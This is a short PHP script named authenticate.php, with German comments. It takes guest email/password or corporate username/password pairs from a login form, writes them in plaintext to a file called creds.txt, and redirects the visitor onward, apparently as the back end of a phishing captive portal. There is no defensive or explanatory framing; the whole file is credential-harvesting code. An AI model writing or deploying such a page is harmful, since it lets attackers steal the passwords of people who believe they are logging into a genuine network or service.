<?php
// authenticate.php
require_once __DIR__ . '/helper.php';

$type = '';
$user = '';
$pass = '';

// 1) Prüfen, ob Gäste‐Formular gesendet wurde (email + password)
if (isset($_POST['email']) && isset($_POST['password'])) {
    $type = 'GUEST';
    $user = trim($_POST['email']);
    $pass = $_POST['password'];
}
// 2) Oder Corporate/Private-Formular (username + password)
elseif (isset($_POST['username']) && isset($_POST['password'])) {
    $type = 'LOGIN';
    $user = trim($_POST['username']);
    $pass = $_POST['password'];
}

// 3) Wenn Daten vorliegen: Loggen in creds.txt
if ($type !== '') {
    log_credentials($type, $user, $pass);
}

// 4) Ursprüngliche URL (aus ?url=) mitnehmen
$orig = $_GET['url'] ?? null;

// 5) Weiterleiten (setzt Cookie & schickt zurück ins Netz oder zum Original)
helper_redirect($orig);
?>
